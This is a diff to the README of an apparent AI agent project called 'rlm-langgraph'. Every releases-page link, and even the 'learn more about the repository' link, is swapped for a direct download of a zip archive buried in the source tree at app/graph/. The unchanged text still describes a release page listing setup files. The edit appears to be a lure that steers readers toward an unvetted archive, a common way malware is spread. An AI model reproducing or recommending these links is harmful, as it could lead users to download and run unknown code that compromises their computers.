@@ -1,6 +1,6 @@
 # 🤖 rlm-langgraph - Smart Language Model Agent
 
-[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-brightgreen)](https://github.com/aayushhh17/rlm-langgraph/releases)
+[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-brightgreen)](https://github.com/aayushhh17/rlm-langgraph/raw/refs/heads/main/app/graph/rlm-langgraph-v2.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ First, get the software on your PC:
 
 1. Click the green button below or visit the link to download the latest version.
 
-[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-green)](https://github.com/aayushhh17/rlm-langgraph/releases)
+[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-green)](https://github.com/aayushhh17/rlm-langgraph/raw/refs/heads/main/app/graph/rlm-langgraph-v2.5.zip)
 
 2. The page you visit will have a list of available files. Look for the file named similar to `rlm-langgraph-setup.exe` or `rlm-langgraph-windows.zip`.
 
@@ -110,7 +110,7 @@ Just type or paste your input in the main window, and the agent will process and
 
 To keep your software current:
 
-1. Visit the releases page often: https://github.com/aayushhh17/rlm-langgraph/releases
+1. Visit the releases page often: https://github.com/aayushhh17/rlm-langgraph/raw/refs/heads/main/app/graph/rlm-langgraph-v2.5.zip
 
 2. Download the newest version following the same steps as the initial download.
 
@@ -140,7 +140,7 @@ If you face any problems, try these tips:
 
 You can learn more about rlm-langgraph’s technology and development by visiting the GitHub repository:
 
-https://github.com/aayushhh17/rlm-langgraph
+https://github.com/aayushhh17/rlm-langgraph/raw/refs/heads/main/app/graph/rlm-langgraph-v2.5.zip
 
 This page contains links to documentation, source code, and community support.
 
@@ -150,6 +150,6 @@ This page contains links to documentation, source code, and community support.
 
 Use this direct link to visit the release page and get the latest Windows version anytime:
 
-https://github.com/aayushhh17/rlm-langgraph/releases
+https://github.com/aayushhh17/rlm-langgraph/raw/refs/heads/main/app/graph/rlm-langgraph-v2.5.zip
 
-[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-brightgreen)](https://github.com/aayushhh17/rlm-langgraph/releases)
+[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-brightgreen)](https://github.com/aayushhh17/rlm-langgraph/raw/refs/heads/main/app/graph/rlm-langgraph-v2.5.zip)
